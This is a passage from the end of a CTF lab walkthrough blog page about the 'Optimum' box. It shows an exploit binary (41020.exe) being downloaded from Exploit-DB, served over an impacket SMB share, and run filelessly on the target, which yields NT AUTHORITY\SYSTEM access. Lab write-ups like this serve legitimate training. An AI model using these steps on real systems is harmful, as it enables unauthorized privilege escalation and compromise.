+--2020-05-03 <span class="m">14</span>:32:23--  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+Resolving github.com <span class="o">(</span>github.com<span class="o">)</span>... <span class="m">192</span>.30.255.113
+Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">|</span><span class="m">192</span>.30.255.113<span class="p">|</span>:443... connected.
+HTTP request sent, awaiting response... <span class="m">302</span> Found
+Location: https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/41020.exe <span class="o">[</span>following<span class="o">]</span>
+--2020-05-03 <span class="m">14</span>:32:24--  https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/41020.exe
+Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... <span class="m">151</span>.101.188.133
+Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">|</span><span class="m">151</span>.101.188.133<span class="p">|</span>:443... connected.
+HTTP request sent, awaiting response... <span class="m">200</span> OK
+Length: <span class="m">560128</span> <span class="o">(</span>547K<span class="o">)</span> <span class="o">[</span>application/octet-stream<span class="o">]</span>
+Saving to: ‘41020.exe’
+
+<span class="m">41020</span>.exe                                                                      <span class="m">100</span>%<span class="o">[===================================================================================================================================================================================================</span>&gt;<span class="o">]</span> <span class="m">547</span>.00K  <span class="m">1</span>.99MB/s    in <span class="m">0</span>.3s    
+
+<span class="m">2020</span>-05-03 <span class="m">14</span>:32:25 <span class="o">(</span><span class="m">1</span>.99 MB/s<span class="o">)</span> - ‘41020.exe’ saved <span class="o">[</span><span class="m">560128</span>/560128<span class="o">]</span>
+<span class="c1"># /usr/bin/impacket-smbserver -smb2support share .</span>
+</pre></div>
+
+
+<p>Then all we need to do is run execute the exploit; we can do so without touching disk by executing directly from the SMB share like so:</p>
+<div class="highlight"><pre><span></span><span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">kostas</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span><span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">19</span><span class="err">\</span><span class="k">share</span><span class="err">\</span><span class="mi">41020</span><span class="p">.</span><span class="n">exe</span>
+<span class="err">\\</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">14</span><span class="p">.</span><span class="mi">19</span><span class="err">\</span><span class="k">share</span><span class="err">\</span><span class="mi">41020</span><span class="p">.</span><span class="n">exe</span>
+<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="k">Version</span> <span class="mi">6</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">9600</span><span class="p">]</span>
+<span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2013</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="p">.</span> <span class="k">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="p">.</span>
+
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">kostas</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span><span class="n">whoami</span> <span class="o">&amp;&amp;</span> <span class="n">hostname</span>
+<span class="n">whoami</span> <span class="o">&amp;&amp;</span> <span class="n">hostname</span>
+<span class="n">nt</span> <span class="n">authority</span><span class="err">\</span><span class="k">system</span>
+<span class="n">optimum</span>
+
+<span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">kostas</span><span class="err">\</span><span class="n">Documents</span><span class="o">&gt;</span><span class="n">dir</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span>
+<span class="n">dir</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span>
+ <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="k">C</span> <span class="n">has</span> <span class="k">no</span> <span class="n">label</span><span class="p">.</span>
+ <span class="n">Volume</span> <span class="nb">Serial</span> <span class="nb">Number</span> <span class="k">is</span> <span class="n">D0BC</span><span class="o">-</span><span class="mi">0196</span>
+
+ <span class="n">Directory</span> <span class="k">of</span> <span class="k">C</span><span class="p">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span>
+
+<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">14</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">.</span>
+<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">14</span>     <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="p">..</span>
+<span class="mi">18</span><span class="o">/</span><span class="mi">03</span><span class="o">/</span><span class="mi">2017</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">14</span>                 <span class="mi">32</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+               <span class="mi">1</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>             <span class="mi">32</span> <span class="n">bytes</span>
+               <span class="mi">2</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">31</span><span class="p">.</span><span class="mi">870</span><span class="p">.</span><span class="mi">459</span><span class="p">.</span><span class="mi">904</span> <span class="n">bytes</span> <span class="k">free</span>
+</pre></div>
+
+
+<p>And like that we now have system privileges on the exploited box! This concludes the guide; thank you for reading.</p>
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<footer class="footer">
+    <p>&copy; LogistyxCat &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+</body>
+</html>
